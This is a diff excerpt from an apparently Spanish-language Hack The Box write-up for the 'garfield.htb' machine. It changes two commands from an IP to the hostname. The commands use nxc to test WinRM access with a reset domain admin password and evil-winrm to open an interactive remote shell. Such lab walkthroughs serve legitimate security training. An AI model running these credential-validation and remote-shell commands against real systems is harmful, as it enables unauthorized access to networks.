@@ -250,13 +250,13 @@ Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureStr
 Se valida el acceso por WinRM:
 
 ```bash
-nxc winrm 10.129.195.195 -u 'l.wilson_adm' -p 'WhoKnows123!'
+nxc winrm garfield.htb -u 'l.wilson_adm' -p 'WhoKnows123!'
 ```
 
 Si la validación es correcta, se obtiene shell interactiva:
 
 ```bash
-evil-winrm -i 10.129.195.195 -u l.wilson_adm -p 'WhoKnows123!'
+evil-winrm -i garfield.htb -u l.wilson_adm -p 'WhoKnows123!'
 ```
 
 ---
